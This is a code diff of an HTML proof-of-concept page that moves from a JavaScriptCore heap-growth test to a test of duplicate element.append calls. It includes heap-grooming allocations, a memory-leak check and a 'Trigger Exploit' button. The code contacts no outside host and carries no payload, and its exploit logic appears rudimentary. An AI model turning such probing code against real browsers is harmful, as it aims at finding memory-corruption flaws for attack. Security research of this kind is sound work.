@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>JSC Heap Growth PoC</title>
+    <title>DOM Append PoC</title>
     <style>
         #trigger {
             margin: 20px;
@@ -20,8 +20,8 @@
     </style>
 </head>
 <body>
-    <h1>JSC Heap Growth PoC</h1>
-    <p>Click to test heap growth vulnerability</p>
+    <h1>DOM Append PoC</h1>
+    <p>Click to test element.append vulnerability</p>
     <button id="trigger">Trigger Exploit</button>
     <script>
         function stressHeap() {
@@ -34,14 +34,6 @@
             return buffers;
         }
 
-        function createLargeObject() {
-            const obj = {};
-            for (let i = 0; i < 500; i++) {
-                obj[`key${i}`] = new Array(500).fill('A');
-            }
-            return obj;
-        }
-
         function checkMemoryLeak() {
             const buf = new Uint8Array(4);
             buf.fill(0x46);
@@ -52,27 +44,27 @@
             alert('Grooming heap...');
             stressHeap();
 
-            alert('Creating large objects...');
-            const objects = [];
+            alert('Creating parent and elements...');
+            const parent = document.createElement('div');
+            const x = document.createElement('x');
+            const y = document.createElement('y');
+
+            alert('Appending duplicate elements...');
             for (let i = 0; i < 100; i++) {
-                objects.push(createLargeObject());
+                parent.append(x, y, x);
                 const leak = checkMemoryLeak();
                 if (leak) {
                     alert(leak);
                 }
             }
 
-            alert('Forcing GC cycles...');
-            for (let i = 0; i < 50; i++) {
-                const temp = new ArrayBuffer(32 * 1024);
-                objects.push(temp);
-                const leak = checkMemoryLeak();
-                if (leak) {
-                    alert(leak);
-                }
+            alert('Checking parent child nodes...');
+            if (parent.childNodes.length !== 2 || parent.childNodes[0] !== y || parent.childNodes[1] !== x) {
+                alert(`Unexpected DOM state: ${parent.childNodes.length} nodes`);
+            } else {
+                alert('DOM state as expected');
             }
 
-            alert('Checking final memory changes...');
             const leak = checkMemoryLeak();
             if (leak) {
                 alert(leak);
